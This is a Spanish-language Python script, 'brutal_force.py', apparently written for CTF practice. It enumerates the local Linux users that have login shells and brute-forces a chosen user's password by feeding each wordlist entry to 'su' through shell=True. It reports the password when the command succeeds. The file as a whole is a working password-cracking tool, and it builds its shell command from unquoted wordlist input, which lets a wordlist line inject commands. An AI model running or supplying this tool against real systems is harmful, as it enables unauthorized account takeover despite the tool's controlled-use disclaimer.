
import signal
import sys
import time
import platform
import argparse
import pwd
import subprocess
import os

#COLORS
RESET = "\033[0m"
BOLD  = "\033[1m"  
GREEN = "\033[38;5;46m"
RED = "\033[38;5;196m"
YELLOW = "\033[38;5;226m"

def print_banner():
    banner = f"""{GREEN}{BOLD}
    
        ██████╗ ██████╗ ██╗   ██╗████████╗ █████╗ ██╗         ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
        ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔══██╗██║         ██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
        ██████╔╝██████╔╝██║   ██║   ██║   ███████║██║         █████╗  ██║   ██║██████╔╝██║      █████╗  
        ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══██║██║         ██╔══╝  ██║   ██║██╔══██╗██║      ██╔══╝  
        ██████╔╝██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗    ██║     ╚██████╔╝██║  ██║╚██████  ███████╗
        ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                        
       {GREEN}{BOLD}   \033[38;5;46mHerramienta diseñada por x0Spectral | v1.0 — Utilizar únicamente en entornos controlados\033[0m\n
{RESET}
"""
    print(banner)

def ctrl_c(sig,frame):
    print(f"{RED}{BOLD}\n[!] Script abortado, procediendo a salida no existosa{RESET}")
    sys.exit(1)

def execute_trap():
    signal.signal(signal.SIGINT, ctrl_c)

def operative_system_detection():
    if platform.system() == "Linux":
        print(f"{GREEN}{BOLD}[+] Sistema Linux detectado, se puede continuar con el script{RESET}")
        time.sleep(2)
    if platform.system() == "Windows":
        print(f"{RED}{BOLD}[-] Sistema Windows detectado, no se puede continuar con el script{RESET}")
        sys.exit(1)
    if platform.system() == "Darwin":
        print(f"{RED}{BOLD}[-] Sistema MAC detectado, no se puede continuar con el script{RESET}")
        sys.exit(1)
        
def obtain_args():
    parser = argparse.ArgumentParser(
        prog="brutal_force.py",
        description="Herramienta destinada a realizar ataques de fuerza bruta contra login de usuarios en Linux",
        epilog="No utilizar esta herramienta fuera de CTFs o entornos controlados",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument("-u","--user", help="Usuario a vulnerar", required=True)
    parser.add_argument("-w", "--wordlist", help="Diccionario a utilizar", required=True)
    
    return parser.parse_args()

def progress_bar(current, total, width=40):
    filled = int(current*width/total)
    bar =(f"{GREEN}{BOLD}" + "█" * filled + "-" * (width - filled))
    
    sys.stdout.write(f"{GREEN}{BOLD}\r[{bar}] {YELLOW}{BOLD}Lineas: {current}/{total} Progreso: [{current/total*100:.6f}%]{RESET}")  
    
    if current >= total:
       sys.stdout.write("\n")      

def get_valid_users():
    users = []
    for user in pwd.getpwall():
        if user.pw_uid >= 1000 and user.pw_shell not in ("/usr/sbin/nologin","/bin/false"):
            users.append(user.pw_name)
    return users

def executor(cmd):
    if not cmd:
        print(f"No se ha proporcionado un comando")
    result = subprocess.run(cmd, shell=True, text=True, capture_output=True)
    return result.returncode

def search_again(user):
    answer = input(f"{RED}{BOLD}\n[?] ¿Quieres utilizar otro diccionario? [S/N] ")
    if answer.lower() == 's':
        wordlist = input(f"{GREEN}{BOLD}\n[+] Proporciona una nueva ruta para el diccionario: {RESET}")
        if os.path.exists(wordlist):
            brute_forcer(user, wordlist)
        else:
            print(f"{RED}{BOLD}\n[-] No existe ese diccionario en este equipo{RESET}")
            sys.exit(1)
    else:
        sys.exit(1)

def brute_forcer(user, wordlist):
    if not user or not wordlist:
        print("No se han proporcionado los argumentos necesarios")
        sys.exit(1)
    users = get_valid_users()
    if user not in users:
        print(f"{RED}{BOLD}\n[-] No se ha proporcionado un usuario válido{RESET}")
        sys.exit(1)
    if not os.path.exists(wordlist):
        print(f"{RED}{BOLD}\n[-] No se ha proporcionado una ruta válida de diccionario{RESET}")
        sys.exit(1)
    with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
        total = sum(1 for _ in f)
        if total == 0:
            print(f"{RED}{BOLD}\n[-] El archivo proporcionado está vacío{RESET}")
    print(f"{GREEN}{BOLD}\n[+] El archivo proporcionado tiene un total de {total} líneas{RESET}")
    time.sleep(2)
    print(f"{GREEN}{BOLD}\n[+] Vulnerando el login de {user} utilizando el diccionario {wordlist}{RESET}\n")
    
    with open(wordlist, "r", encoding="latin-1") as f:
        for i,line in enumerate(f, start=1):
            password = line.strip()
            command = f"echo {password} | timeout 0.2 bash -c 'su {user} -c whoami &>/dev/null'"
            progress_bar(i,total,width=40)
            code = executor(command)
            if code == 0:
                print(f"{GREEN}{BOLD}\n\n[+] La contraseña para el usuario: {user} es: {password}{RESET}")
                sys.exit(0)
        print(f"{RED}{BOLD}\n[-] No se ha podido encontrar la contraseña para el usuario {user}{RESET}")
    search_again(user)
        
def main():
    print_banner()
    execute_trap()
    operative_system_detection()
    args = obtain_args()
    brute_forcer(args.user,args.wordlist)
    
    
if __name__ == '__main__':
    main()
